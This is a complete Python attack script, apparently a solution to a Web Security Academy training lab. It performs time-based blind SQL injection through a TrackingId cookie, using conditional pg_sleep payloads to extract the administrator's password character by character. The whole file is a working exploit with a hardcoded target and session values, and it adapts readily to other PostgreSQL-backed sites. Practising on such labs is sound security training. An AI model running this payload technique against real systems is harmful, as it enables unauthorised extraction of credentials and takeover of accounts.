import requests
import string
import time

# Configuration
URL = "https://0a34005f03c9bad3803d1c11005d00fe.web-security-academy.net/filter"
SESSION_COOKIE = "U9PbR4HyxAI1VP0JiySKHlU23dBx0G9f"
TRACKING_ID_BASE = "J87paowLfwsPyOXD"

# Characters to test (alphanumeric + common special chars)
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits

# Sleep time in the SQL injection (seconds)
SLEEP_TIME = 5

# Threshold for detecting sleep (seconds)
TIME_THRESHOLD = 4

def test_character(position, char):
    """Test if a character at a given position matches"""
    
    # SQL injection payload
    payload = f"{TRACKING_ID_BASE}' AND (SELECT CASE WHEN (SUBSTRING(password,{position},1)='{char}') THEN pg_sleep({SLEEP_TIME}) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -"
    
    cookies = {
        'TrackingId': payload,
        'session': SESSION_COOKIE
    }
    
    params = {
        'category': 'Lifestyle'
    }
    
    # Measure response time
    start_time = time.time()
    try:
        response = requests.get(URL, cookies=cookies, params=params, timeout=15)
        elapsed_time = time.time() - start_time
        
        # If response took longer than threshold, character matches
        return elapsed_time >= TIME_THRESHOLD
    except requests.exceptions.Timeout:
        # Timeout means the sleep was triggered
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def extract_password(length=20):
    """Extract the password character by character"""
    password = ""
    
    print(f"[*] Starting password extraction (length: {length})")
    print(f"[*] Character set: {CHARSET}")
    print(f"[*] Sleep time: {SLEEP_TIME}s, Threshold: {TIME_THRESHOLD}s\n")
    
    for position in range(1, length + 1):
        found = False
        
        for char in CHARSET:
            print(f"[*] Testing position {position}/{length}: '{char}'", end='\r')
            
            if test_character(position, char):
                password += char
                print(f"\n[+] Found character at position {position}: '{char}' - Current password: {password}")
                found = True
                break
        
        if not found:
            print(f"\n[-] No character found at position {position}")
            # Try continuing anyway
            password += "?"
    
    return password

if __name__ == "__main__":
    print("=" * 60)
    print("Time-Based SQL Injection - Password Extractor")
    print("=" * 60)
    print()
    
    # Extract password
    password = extract_password(length=20)
    
    print("\n" + "=" * 60)
    print(f"[+] EXTRACTED PASSWORD: {password}")
    print("=" * 60)
